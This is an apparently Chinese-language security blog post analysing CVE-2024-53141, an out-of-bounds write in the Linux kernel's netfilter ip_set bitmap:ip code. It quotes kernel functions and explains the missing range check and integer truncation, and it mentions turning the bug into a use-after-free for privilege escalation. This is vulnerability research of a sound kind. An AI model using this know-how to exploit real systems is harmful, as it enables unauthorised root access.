<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="CVE-2024-53141一.漏洞背景​	该漏洞产生于ip_set的功能中由于在使用无类域间路由来更新ipset的bitmap集合的时候，并没有对于设置完掩码之后的更新ip地址与创建ip_set的初始地址进行比较，导致可以从一个异常的Ip地址开始进行插入，并且由于存在一个32位的int强制转化成16位，导致实现对于bitmap的异常访问，导致可以越界写一个堆地址，通过构造msg_msg以及sk_">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-53141">
<meta property="og:url" content="http://example.com/2025/03/18/CVE-2024-53141/index.html">
<meta property="og:site_name" content="a2ure&#39;s blog">
<meta property="og:description" content="CVE-2024-53141一.漏洞背景​	该漏洞产生于ip_set的功能中由于在使用无类域间路由来更新ipset的bitmap集合的时候，并没有对于设置完掩码之后的更新ip地址与创建ip_set的初始地址进行比较，导致可以从一个异常的Ip地址开始进行插入，并且由于存在一个32位的int强制转化成16位，导致实现对于bitmap的异常访问，导致可以越界写一个堆地址，通过构造msg_msg以及sk_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742260034819.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742260081534.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742261583103.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742261699346.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742261755154.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742262046593.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742266065592.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742265989434.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742266615726.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742266623700.jpg">
<meta property="og:image" content="http://example.com/images/CVE-2024-53141/1742267449936.jpg">
<meta property="article:published_time" content="2025-03-18T06:15:31.000Z">
<meta property="article:modified_time" content="2025-03-18T06:19:24.006Z">
<meta property="article:author" content="a2ure">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/CVE-2024-53141/1742260034819.jpg">

<link rel="canonical" href="http://example.com/2025/03/18/CVE-2024-53141/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>CVE-2024-53141 | a2ure's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">a2ure's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/18/CVE-2024-53141/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2024-53141
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-03-18 14:15:31 / Modified: 14:19:24" itemprop="dateCreated datePublished" datetime="2025-03-18T14:15:31+08:00">2025-03-18</time>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="CVE-2024-53141"><a href="#CVE-2024-53141" class="headerlink" title="CVE-2024-53141"></a>CVE-2024-53141</h1><h2 id="一-漏洞背景"><a href="#一-漏洞背景" class="headerlink" title="一.漏洞背景"></a>一.漏洞背景</h2><p>​	该漏洞产生于ip_set的功能中由于在使用无类域间路由来更新ipset的bitmap集合的时候，并没有对于设置完掩码之后的更新ip地址与创建ip_set的初始地址进行比较，导致可以从一个异常的Ip地址开始进行插入，并且由于存在一个32位的int强制转化成16位，导致实现对于bitmap的异常访问，导致可以越界写一个堆地址，通过构造msg_msg以及sk_buff可以使得最终实现UAF漏洞。这个漏洞存在的范围很长从v2.7 - v6.12，但是实际上在复现的过程中发现，对于kernel版本是5之前的，不支持ip_set 7，并且强行cmp比对，因此对于后面的脚本需要修改到ip_set 6才可以打通。</p>
<h3 id="1-1-ip-set介绍"><a href="#1-1-ip-set介绍" class="headerlink" title="1.1 ip_set介绍"></a>1.1 ip_set介绍</h3><p>​	这里借用<a target="_blank" rel="noopener" href="https://u1f383.github.io/linux/2025/01/07/cve-2024-53141-an-oob-write-vulnerability-in-netfilter-ipset.html">链接</a>的部分内容，主要是对于Ip_set创建以及更新的部分进行讲解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ip_set(inst, id)        \</span></span><br><span class="line"><span class="meta">    ip_set_dereference(inst)[id]</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_set_create</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="type">const</span> <span class="keyword">struct</span> nfnl_info *info,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> attr[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_set_net</span> *<span class="title">inst</span> =</span> ip_set_pernet(info-&gt;net);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_set</span> *<span class="title">set</span>, *<span class="title">clash</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    name = nla_data(attr[IPSET_ATTR_SETNAME]);</span><br><span class="line">    typename = nla_data(attr[IPSET_ATTR_TYPENAME]);</span><br><span class="line">    family = nla_get_u8(attr[IPSET_ATTR_FAMILY]);</span><br><span class="line">    revision = nla_get_u8(attr[IPSET_ATTR_REVISION]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">set</span> = kzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">set</span>), GFP_KERNEL); <span class="comment">// [3]</span></span><br><span class="line">    strscpy(<span class="built_in">set</span>-&gt;name, name, IPSET_MAXNAMELEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    ret = find_set_type_get(typename, family, revision, &amp;<span class="built_in">set</span>-&gt;type); <span class="comment">// [4]</span></span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">set</span>-&gt;type-&gt;create(info-&gt;net, <span class="built_in">set</span>, tb, flags); <span class="comment">// [5]</span></span><br><span class="line"></span><br><span class="line">    ret = find_free_id(inst, <span class="built_in">set</span>-&gt;name, &amp;index, &amp;clash); <span class="comment">// [6]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    ip_set(inst, index) = <span class="built_in">set</span>; <span class="comment">// [7]</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 Linux 内核的 Netfilter 子系统 IP 集合（ip_set）框架中，ip_set_create 函数负责根据用户态传入的配置参数动态创建新的集合实例。以 bitmap:ip 类型为例，其核心流程始于从 Netlink 消息中提取关键参数：用户指定的集合名称（name）、类型标识符（typename，如 “bitmap:ip”）、地址族（family，通常为 AF_INET）及版本号（revision）。内核首先通过 kzalloc 分配 ip_set 结构体内存并初始化基础属性，随后调用 find_set_type_get 在全局注册的类型列表中匹配与 typename 和 revision 对应的集合类型操作集（struct ip_set_type），这一过程隐式验证了类型合法性。完成类型绑定后，内核触发类型专属的 create 回调函数（如 bitmap_ip_create），由该函数解析类型相关的扩展参数（如 IP 范围、位图尺寸）并初始化类型私有数据结构。最后，通过 find_free_id 在全局实例表中分配唯一索引，将新创建的集合插入 ip_set_net 的二维指针数组完成注册，漏洞点发生在bitmap的创建和插入过程中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_set_uadd</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="type">const</span> <span class="keyword">struct</span> nfnl_info *info,</span></span><br><span class="line"><span class="params">               <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> attr[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ip_set_ad(info-&gt;net, info-&gt;sk, skb,</span><br><span class="line">             IPSET_ADD, info-&gt;nlh, attr, info-&gt;extack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ip_set_ad</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *ctnl,</span></span><br><span class="line"><span class="params">             <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">             <span class="keyword">enum</span> ipset_adt adt,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> nlmsghdr *nlh,</span></span><br><span class="line"><span class="params">             <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> attr[],</span></span><br><span class="line"><span class="params">             <span class="keyword">struct</span> netlink_ext_ack *extack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_set</span> *<span class="title">set</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> = find_set(inst, nla_data(attr[IPSET_ATTR_SETNAME])); <span class="comment">// [8]</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    nla_parse_nested(tb, IPSET_ATTR_ADT_MAX,</span><br><span class="line">                     attr[IPSET_ATTR_DATA],</span><br><span class="line">                     <span class="built_in">set</span>-&gt;type-&gt;adt_policy, <span class="literal">NULL</span>);</span><br><span class="line">    ret = call_ad(net, ctnl, skb, <span class="built_in">set</span>, tb, adt, flags, <span class="comment">// [9]</span></span><br><span class="line">                  use_lineno);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">call_ad</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *ctnl, <span class="keyword">struct</span> sk_buff *skb,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[], <span class="keyword">enum</span> ipset_adt adt,</span></span><br><span class="line"><span class="params">    u32 flags, <span class="type">bool</span> use_lineno)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ip_set_lock(<span class="built_in">set</span>);</span><br><span class="line">        ret = <span class="built_in">set</span>-&gt;variant-&gt;uadt(<span class="built_in">set</span>, tb, adt, &amp;lineno, flags, retried); <span class="comment">// [10]</span></span><br><span class="line">        ip_set_unlock(<span class="built_in">set</span>);</span><br><span class="line">        retried = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="comment">/*...*/</span>);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 Netfilter IP 集合的成员操作流程中，ip_set_uadd 作为用户态添加元素请求的入口函数，通过 ip_set_ad 间接完成核心操作。该函数首先根据集合名称从全局实例表（ip_set_net）中查找目标集合对象（find_set），随后解析嵌套的 Netlink 属性（nla_parse_nested）以提取待操作数据（如 IP 地址、端口范围等）。最终通过 call_ad 触发类型特定的操作函数（set-&gt;variant-&gt;uadt），在持有集合锁（ip_set_lock）的同步上下文中执行原子化的位图更新、哈希表插入等底层操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">         u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP], &amp;first_ip);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (tb[IPSET_ATTR_IP_TO]) &#123;</span><br><span class="line">        ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP_TO], &amp;last_ip);</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tb[IPSET_ATTR_NETMASK]) &#123;</span><br><span class="line">        netmask = nla_get_u8(tb[IPSET_ATTR_NETMASK]);</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mask = range_to_mask(first_ip, last_ip, &amp;mask_bits);</span><br><span class="line">    elements = <span class="number">2UL</span> &lt;&lt; (netmask - mask_bits - <span class="number">1</span>); <span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">map</span> = ip_set_alloc(<span class="keyword">sizeof</span>(*<span class="built_in">map</span>) + elements * <span class="built_in">set</span>-&gt;dsize); <span class="comment">// [2]</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;memsize = BITS_TO_LONGS(elements) * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="built_in">set</span>-&gt;variant = &amp;bitmap_ip;</span><br><span class="line">    init_map_ip(<span class="built_in">set</span>, <span class="built_in">map</span>, first_ip, last_ip, elements, hosts, netmask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">init_map_ip</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> bitmap_ip *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">        u32 first_ip, u32 last_ip,</span></span><br><span class="line"><span class="params">        u32 elements, u32 hosts, u8 netmask)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="built_in">map</span>-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line">    <span class="built_in">set</span>-&gt;data = <span class="built_in">map</span>; <span class="comment">// [3]</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 bitmap:ip 类型集合的创建过程中，bitmap_ip_create 函数通过解析用户传入的起始 IP（IPSET_ATTR_IP）、终止 IP（IPSET_ATTR_IP_TO）及子网掩码（IPSET_ATTR_NETMASK）参数，动态计算 IP 地址范围并推导出位图存储的容量需求。关键操作中，内核首先将 IP 范围与掩码结合，通过 range_to_mask 计算实际覆盖的地址段，再以 elements &#x3D; 2UL &lt;&lt; (netmask - mask_bits - 1) 公式确定位图的理论容量。随后通过 ip_set_alloc 分配复合内存结构：除基础 bitmap_ip 结构体外，额外为每个元素预留 set-&gt;dsize 长度的扩展空间，这种弹性设计允许后续功能模块（如 comment 扩展）动态挂载附加数据区（如注释字符串指针）。最终，init_map_ip 将分配的内存与 ip_set 主结构绑定，通过 set-&gt;data &#x3D; map 实现双向关联，同时初始化位图的存储参数（如内存布局、IP 边界），为后续的增删查操作奠定数据基础。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ip_set_mask_from_to(from, to, cidr)    \</span></span><br><span class="line"><span class="meta">do &#123;                                           \</span></span><br><span class="line"><span class="meta">    from &amp;= ip_set_hostmask(cidr);             \</span></span><br><span class="line"><span class="meta">    to = from | ~ip_set_hostmask(cidr);        \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bitmap_ip_uadt</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="keyword">struct</span> nlattr *tb[],</span></span><br><span class="line"><span class="params">           <span class="keyword">enum</span> ipset_adt adt, u32 *lineno, u32 flags, <span class="type">bool</span> retried)</span></span><br><span class="line">&#123;</span><br><span class="line">    ipset_adtfn adtfn = <span class="built_in">set</span>-&gt;variant-&gt;adt[adt];</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP], &amp;ip);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (ip &lt; <span class="built_in">map</span>-&gt;first_ip || ip &gt; <span class="built_in">map</span>-&gt;last_ip) <span class="comment">// [4]</span></span><br><span class="line">        <span class="keyword">return</span> -IPSET_ERR_BITMAP_RANGE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tb[IPSET_ATTR_IP_TO]) &#123;</span><br><span class="line">        ret = ip_set_get_hostipaddr4(tb[IPSET_ATTR_IP_TO], &amp;ip_to);</span><br><span class="line">        <span class="keyword">if</span> (ip &gt; ip_to) &#123;</span><br><span class="line">            swap(ip, ip_to);</span><br><span class="line">            <span class="keyword">if</span> (ip &lt; <span class="built_in">map</span>-&gt;first_ip) <span class="comment">// [5]</span></span><br><span class="line">                <span class="keyword">return</span> -IPSET_ERR_BITMAP_RANGE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tb[IPSET_ATTR_CIDR]) &#123;</span><br><span class="line">        u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        ip_set_mask_from_to(ip, ip_to, cidr); <span class="comment">// [6]</span></span><br><span class="line">    &#125; <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ip_to &gt; <span class="built_in">map</span>-&gt;last_ip) <span class="comment">// [7]</span></span><br><span class="line">        <span class="keyword">return</span> -IPSET_ERR_BITMAP_RANGE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; !before(ip_to, ip); ip += <span class="built_in">map</span>-&gt;hosts) &#123;</span><br><span class="line">        e.id = ip_to_id(<span class="built_in">map</span>, ip);</span><br><span class="line">        ret = adtfn(<span class="built_in">set</span>, &amp;e, &amp;ext, &amp;ext, flags); <span class="comment">// [8]</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bitmap_ip_adt_elem</span> &#123;</span></span><br><span class="line">	u16 id;</span><br><span class="line">&#125;;	</span><br><span class="line"><span class="type">static</span> u32</span><br><span class="line"><span class="title function_">ip_to_id</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bitmap_ip *m, u32 ip)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ((ip &amp; ip_set_hostmask(m-&gt;netmask)) - m-&gt;first_ip) / m-&gt;hosts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 bitmap:ip 类型的元素添加逻辑中，bitmap_ip_uadt 函数通过解析用户传入的 IP、IP_TO 或 CIDR 参数，动态生成目标 IP 地址段并进行边界校验。当用户指定 CIDR 格式时，内核通过 ip_set_mask_from_to 宏将 CIDR 掩码转换为连续 IP 范围，该宏以网络序对起始 IP（ip）进行掩码截断，生成规范化的起止地址（如 192.168.1.0&#x2F;24 将生成 ip&#x3D;192.168.1.0，ip_to&#x3D;192.168.1.255）。然而，在后续校验流程中，代码仅通过 ip_to &gt; map-&gt;last_ip 检查终止地址是否超出集合预定义的全局边界（map-&gt;last_ip），却未对规范化后的起始地址 ip 执行下限校验（如 ip &lt; map-&gt;first_ip）。这种单向校验的缺陷使得攻击者可通过构造特定的 CIDR 参数，使 ip_set_mask_from_to 计算出的 ip 远小于 map-&gt;first_ip，而 ip_to 恰好落在合法范围内。此时，ip_to_id 函数将基于越界的 ip 计算出负值的逻辑 ID，但由于返回值类型（u32）与结构体成员类型（u16）不匹配，构造好的整数转换会变成越界的正整数，从而实现越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">mtype_add</span><span class="params">(<span class="keyword">struct</span> ip_set *<span class="built_in">set</span>, <span class="type">void</span> *value, <span class="type">const</span> <span class="keyword">struct</span> ip_set_ext *ext,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> ip_set_ext *mext, u32 flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    set_bit(e-&gt;id, <span class="built_in">map</span>-&gt;members); <span class="comment">// [9]</span></span><br><span class="line">    <span class="built_in">set</span>-&gt;elements++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在 mtype_add 函数中，内核通过 set_bit(e-&gt;id, map-&gt;members) 将目标 IP 地址经 ip_to_id 转换后的数值型 ID 映射到位图（map-&gt;members）的对应比特位，通过置位操作标记该 IP 的存在性，此过程若因 e-&gt;id 超出 map-&gt;members 预分配范围（如 CIDR 漏洞导致 ID 计算为超大值），将引发位图内存的越界写操作，直接篡改相邻内核数据结构，构成提权攻击的原子操作点。</p>
